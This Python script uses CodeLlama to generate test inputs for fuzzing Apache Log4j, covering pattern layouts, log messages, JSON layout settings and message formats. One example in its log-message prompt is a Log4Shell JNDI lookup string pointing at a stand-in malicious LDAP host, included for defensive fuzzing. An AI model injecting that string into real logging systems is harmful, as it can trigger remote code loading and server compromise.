#!/usr/bin/env python3
"""
LLM-guided Log4j Fuzzer

This script uses CodeLlama to generate test inputs for Apache Log4j fuzzing.
It interfaces with the fuzzer by generating patterns, messages and other
inputs that can be used to test Log4j functionality more effectively.
"""

import os
import json
import random
import argparse
import subprocess
import time
from typing import List, Dict, Any, Tuple
import torch
from transformers import AutoTokenizer, AutoModelForCausalLM, pipeline
from tqdm import tqdm
import numpy as np

# Configuration
DEFAULT_MODEL = "codellama/CodeLlama-7b-Instruct-hf"
LOG4J_COMPONENTS = ["PatternLayout", "LogMessages", "JsonLayout", "MessagePattern"]
CACHE_DIR = "/scratch_mount"

class LLMFuzzer:
    def __init__(self, model_name: str = DEFAULT_MODEL, device: str = "cuda", 
                 temperature: float = 0.7, max_length: int = 512):
        """Initialize the LLM-based fuzzer with the specified model."""
        self.model_name = model_name
        self.device = device
        self.temperature = temperature
        self.max_length = max_length
        
        print(f"Loading model {model_name}...")
        self.tokenizer = AutoTokenizer.from_pretrained(model_name, cache_dir=CACHE_DIR)
        
        # Use 4-bit quantization for large models
        self.model = AutoModelForCausalLM.from_pretrained(
            model_name,
            torch_dtype=torch.float16,
            load_in_4bit=True,
            device_map="auto",
            cache_dir=CACHE_DIR
        )
        
        self.pipe = pipeline(
            "text-generation",
            model=self.model,
            tokenizer=self.tokenizer,
            max_length=self.max_length,
            temperature=self.temperature,
            top_p=0.95,
            return_full_text=False
        )
        
        print(f"Model loaded successfully on {self.device}")
        
    def generate_pattern_layout_inputs(self, n_samples: int = 10) -> List[str]:
        """Generate pattern layout strings that are likely to trigger edge cases."""
        prompt = """
        You are an expert in Apache Log4j. Create challenging pattern layouts that would test edge cases.
        Generate patterns that might cause parsing errors, performance issues, or unexpected behavior.
        
        Here are some example patterns to inspire you:
        1. %d{ISO8601} [%t] %p %c - %m%n
        2. %d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n
        3. %d{ABSOLUTE} %-5p [%c{1}] %m%n
        
        Now generate 10 more challenging and diverse pattern layouts:
        """
        
        results = self.pipe(prompt, num_return_sequences=n_samples)
        patterns = []
        
        for result in results:
            text = result['generated_text'].strip()
            # Extract patterns from the text
            for line in text.split('\n'):
                if '%' in line and not line.startswith('#') and not line.startswith('Now generate'):
                    # Extract just the pattern, removing numbers and explanations
                    pattern = line.split('.')[-1].strip() if '.' in line else line
                    pattern = pattern.split(':')[-1].strip() if ':' in pattern else pattern
                    patterns.append(pattern)
                    if len(patterns) >= n_samples:
                        break
            if len(patterns) >= n_samples:
                break
                
        # Ensure we have enough samples
        while len(patterns) < n_samples:
            patterns.append("%d [%p] %c %m%n")
            
        return patterns[:n_samples]
    
    def generate_log_messages(self, n_samples: int = 10) -> List[str]:
        """Generate log messages that could trigger issues in the logging system."""
        prompt = """
        Generate 10 challenging log messages that could trigger bugs in a logging system.
        Include messages with special characters, very long messages, messages with format specifiers,
        Unicode characters, escape sequences, and other edge cases.
        
        Examples:
        1. User input: ${jndi:ldap://malicious.example.com/a}
        2. Error in file C:\\Program Files\\app\\config.xml: Invalid </tag>
        3. 这是一些Unicode文本，可能会导致编码问题
        
        Generate 10 more challenging messages:
        """
        
        results = self.pipe(prompt, num_return_sequences=max(1, n_samples // 10 + 1))
        messages = []
        
        for result in results:
            text = result['generated_text'].strip()
            # Extract messages from the generated text
            for line in text.split('\n'):
                if not line.startswith('#') and not line.startswith('Generate'):
                    # Try to extract the message part
                    if ':' in line and not line.startswith(('1.', '2.', '3.', '4.', '5.', '6.', '7.', '8.', '9.', '10.')):
                        message = line.split(':', 1)[1].strip()
                    elif '.' in line and line[0].isdigit():
                        parts = line.split('.', 1)
                        if len(parts) > 1:
                            message = parts[1].strip()
                        else:
                            message = line
                    else:
                        message = line
                    
                    if message and len(message) > 3:  # Avoid empty or very short messages
                        messages.append(message)
                    
                    if len(messages) >= n_samples:
                        break
            if len(messages) >= n_samples:
                break
                
        # Ensure we have enough samples
        while len(messages) < n_samples:
            messages.append(f"Default log message #{len(messages)+1} with special chars: !@#$%^&*()")
            
        return messages[:n_samples]
    
    def generate_json_layout_config(self, n_samples: int = 10) -> List[Dict[str, bool]]:
        """Generate JSON layout configurations for testing."""
        configs = []
        
        # Define all possible combinations for the boolean properties
        properties = ["properties", "complete", "compact", "eventEol", "includeStacktrace"]
        
        for _ in range(n_samples):
            config = {}
            for prop in properties:
                # Use LLM sometimes to decide, but mostly random to ensure coverage
                if random.random() < 0.8:  # 80% random for better coverage
                    config[prop] = random.choice([True, False])
                else:
                    prompt = f"Should the {prop} property in Log4j JsonLayout be true or false to test edge cases? Answer with just 'true' or 'false'."
                    result = self.pipe(prompt)[0]['generated_text'].strip().lower()
                    config[prop] = 'true' in result
            configs.append(config)
            
        return configs
    
    def generate_message_patterns(self, n_samples: int = 10) -> List[Dict[str, str]]:
        """Generate message patterns and parameters for MessageFormatMessage testing."""
        prompt = """
        Generate 5 complex Java MessageFormat patterns with corresponding parameters.
        Each pattern should test different MessageFormat features like number formatting,
        date formatting, choice formatting, etc.
        
        For each pattern, provide:
        1. The pattern string
        2. Two parameter values to insert
        
        Examples:
        Pattern: "The disk \"{1}\" contains {0,choice,0#no files|1#one file|1<{0,number,integer} files}."
        Param1: 1024
        Param2: "MyDisk"
        
        Pattern: "At {1,time,short} on {1,date,long}, there was {2} on planet {0}."
        Param1: "Jupiter"
        Param2: new java.util.Date()
        Param3: "a meteor shower"
        
        Now generate 5 more complex patterns with parameters:
        """
        
        results = self.pipe(prompt, num_return_sequences=max(1, n_samples // 5 + 1))
        patterns = []
        
        for result in results:
            text = result['generated_text'].strip()
            current_item = {}
            for line in text.split('\n'):
                line = line.strip()
                if line.startswith('Pattern:'):
                    if current_item and 'pattern' in current_item:
                        patterns.append(current_item)
                        current_item = {}
                    current_item['pattern'] = line.replace('Pattern:', '').strip().strip('"\'')
                elif line.startswith('Param1:'):
                    current_item['param1'] = line.replace('Param1:', '').strip().strip('"\'')
                elif line.startswith('Param2:'):
                    current_item['param2'] = line.replace('Param2:', '').strip().strip('"\'')
                    # Once we have all the needed parts, append the item
                    if 'pattern' in current_item and 'param1' in current_item and 'param2' in current_item:
                        patterns.append(current_item)
                        current_item = {}
            
            # Check for the last item
            if current_item and 'pattern' in current_item and 'param1' in current_item and 'param2' in current_item:
                patterns.append(current_item)
        
        # Ensure we have enough samples
        while len(patterns) < n_samples:
            patterns.append({
                'pattern': "Default pattern #{0} with parameter {1}",
                'param1': str(len(patterns) + 1),
                'param2': f"param_{random.randint(1, 100)}"
            })
            
        return patterns[:n_samples]
    
    def generate_test_inputs(self, n_samples: int = 50) -> Dict[str, List[Any]]:
        """Generate a complete set of test inputs for all components."""
        print("Generating test inputs...")
        
        # Distribute samples among components
        pattern_count = n_samples // 4
        message_count = n_samples // 4
        json_count = n_samples // 4
        msg_pattern_count = n_samples - pattern_count - message_count - json_count
        
        inputs = {
            "pattern_layouts": self.generate_pattern_layout_inputs(pattern_count),
            "log_messages": self.generate_log_messages(message_count),
            "json_layouts": self.generate_json_layout_config(json_count),
            "message_patterns": self.generate_message_patterns(msg_pattern_count)
        }
        
        print(f"Generated {sum(len(v) for v in inputs.values())} test inputs across {len(inputs)} categories")
        return inputs
        
    def save_test_inputs(self, inputs: Dict[str, List[Any]], output_file: str):
        """Save generated test inputs to a JSON file."""
        with open(output_file, 'w') as f:
            json.dump(inputs, f, indent=2)
        print(f"Saved test inputs to {output_file}")
        
    def generate_java_test_file(self, inputs: Dict[str, List[Any]], output_file: str):
        """Generate a Java file with the test inputs for use with the fuzzer."""
        # Create a template for the Java test file using the LLM
        prompt = """
        Generate a Java class called Log4jTestInputs that contains the following static arrays:
        
        1. public static final String[] PATTERN_LAYOUTS - for pattern layout strings
        2. public static final String[] LOG_MESSAGES - for log messages
        3. public static final boolean[][] JSON_LAYOUT_CONFIGS - 2D array where each inner array has 5 booleans for:
           [properties, complete, compact, eventEol, includeStacktrace]
        4. public static final String[] MESSAGE_PATTERNS - message format patterns
        5. public static final String[][] MESSAGE_PARAMS - 2D array of parameters for the patterns
        
        The class should be in the org.example package and include proper documentation.
        Just generate the basic structure with empty arrays - I'll fill in the values.
        """
        
        java_template = self.pipe(prompt)[0]['generated_text'].strip()
        
        # Now modify the template to include our generated inputs
        # This requires careful string manipulation
        
        # Extract pattern layouts
        pattern_layouts_str = ',\n        '.join(f'"{p.replace("\"", "\\\"")}"' for p in inputs["pattern_layouts"])
        
        # Extract log messages
        log_messages_str = ',\n        '.join(f'"{m.replace("\"", "\\\"")}"' for m in inputs["log_messages"])
        
        # Extract JSON layout configs
        json_configs = inputs["json_layouts"]
        json_configs_str = ',\n        '.join(
            f'{{{c["properties"]}, {c["complete"]}, {c["compact"]}, {c["eventEol"]}, {c["includeStacktrace"]}}}'
            for c in json_configs
        )
        
        # Extract message patterns and params
        message_patterns = inputs["message_patterns"]
        patterns_str = ',\n        '.join(f'"{p["pattern"].replace("\"", "\\\"")}"' for p in message_patterns)
        
        params_str = ',\n        '.join(
            f'{{"{p["param1"].replace("\"", "\\\"")}", "{p["param2"].replace("\"", "\\\"")}"}}'
            for p in message_patterns
        )
        
        # Find the array declarations and replace them with our data
        import re
        java_code = java_template
        
        java_code = re.sub(
            r'public static final String\[\] PATTERN_LAYOUTS\s*=\s*\{\s*\};', 
            f'public static final String[] PATTERN_LAYOUTS = {{\n        {pattern_layouts_str}\n    }};',
            java_code
        )
        
        java_code = re.sub(
            r'public static final String\[\] LOG_MESSAGES\s*=\s*\{\s*\};', 
            f'public static final String[] LOG_MESSAGES = {{\n        {log_messages_str}\n    }};',
            java_code
        )
        
        java_code = re.sub(
            r'public static final boolean\[\]\[\] JSON_LAYOUT_CONFIGS\s*=\s*\{\s*\};', 
            f'public static final boolean[][] JSON_LAYOUT_CONFIGS = {{\n        {json_configs_str}\n    }};',
            java_code
        )
        
        java_code = re.sub(
            r'public static final String\[\] MESSAGE_PATTERNS\s*=\s*\{\s*\};', 
            f'public static final String[] MESSAGE_PATTERNS = {{\n        {patterns_str}\n    }};',
            java_code
        )
        
        java_code = re.sub(
            r'public static final String\[\]\[\] MESSAGE_PARAMS\s*=\s*\{\s*\};', 
            f'public static final String[][] MESSAGE_PARAMS = {{\n        {params_str}\n    }};',
            java_code
        )
        
        # Write the Java file
        with open(output_file, 'w') as f:
            f.write(java_code)
        
        print(f"Generated Java test inputs file: {output_file}")
        
    def enhance_existing_fuzzer(self, fuzzer_file: str, output_file: str):
        """Enhance an existing fuzzer with LLM-generated improvements."""
        # Read the existing fuzzer
        with open(fuzzer_file, 'r') as f:
            fuzzer_code = f.read()
        
        # Generate an improved version
        prompt = f"""
        You are an expert in fuzzing Java applications. Below is the code for a Log4j fuzzer.
        Analyze this code and suggest improvements to make the fuzzer more effective.
        Focus on:
        
        1. Better input generation strategies
        2. Improved coverage
        3. Better detection of issues
        4. More efficient execution
        
        Here's the current code:
        
        ```java
        {fuzzer_code}
        ```
        
        Provide an improved version of this fuzzer. Include explanations as comments.
        """
        
        # This might exceed context limits for very large files
        # Consider chunking if necessary
        improved_code = self.pipe(prompt, 
                                max_length=4096, 
                                temperature=0.2)[0]['generated_text'].strip()
        
        # Extract just the Java code (without markdown code blocks if present)
        if "```java" in improved_code:
            improved_code = improved_code.split("```java")[1].split("```")[0].strip()
        elif "```" in improved_code:
            improved_code = improved_code.split("```")[1].split("```")[0].strip()
            
        # Write the improved fuzzer
        with open(output_file, 'w') as f:
            f.write(improved_code)
            
        print(f"Generated improved fuzzer: {output_file}")
        
def main():
    parser = argparse.ArgumentParser(description="LLM-guided Log4j Fuzzer")
    parser.add_argument("--model", default=DEFAULT_MODEL, help="HuggingFace model name")
    parser.add_argument("--device", default="cuda" if torch.cuda.is_available() else "cpu", 
                        help="Device to run the model on (cuda or cpu)")
    parser.add_argument("--samples", type=int, default=100, help="Number of test inputs to generate")
    parser.add_argument("--output-dir", default="./llm_fuzzing_output", help="Output directory")
    parser.add_argument("--fuzzer-file", default=None, help="Path to existing fuzzer to enhance")
    parser.add_argument("--seed", type=int, default=42, help="Random seed for reproducibility")
    args = parser.parse_args()
    
    # Set random seeds for reproducibility
    random.seed(args.seed)
    np.random.seed(args.seed)
    torch.manual_seed(args.seed)
    if torch.cuda.is_available():
        torch.cuda.manual_seed_all(args.seed)
    
    # Create output directory
    os.makedirs(args.output_dir, exist_ok=True)
    
    # Initialize the LLM fuzzer
    fuzzer = LLMFuzzer(model_name=args.model, device=args.device)
    
    # Generate test inputs
    inputs = fuzzer.generate_test_inputs(n_samples=args.samples)
    
    # Save test inputs as JSON
    json_file = os.path.join(args.output_dir, "llm_test_inputs.json")
    fuzzer.save_test_inputs(inputs, json_file)
    
    # Generate Java test inputs file
    java_file = os.path.join(args.output_dir, "Log4jTestInputs.java")
    fuzzer.generate_java_test_file(inputs, java_file)
    
    # Enhance existing fuzzer if provided
    if args.fuzzer_file:
        output_fuzzer = os.path.join(args.output_dir, "ImprovedLog4jFuzzer.java")
        fuzzer.enhance_existing_fuzzer(args.fuzzer_file, output_fuzzer)
    
    print("LLM fuzzing generation complete!")
    
if __name__ == "__main__":
    main()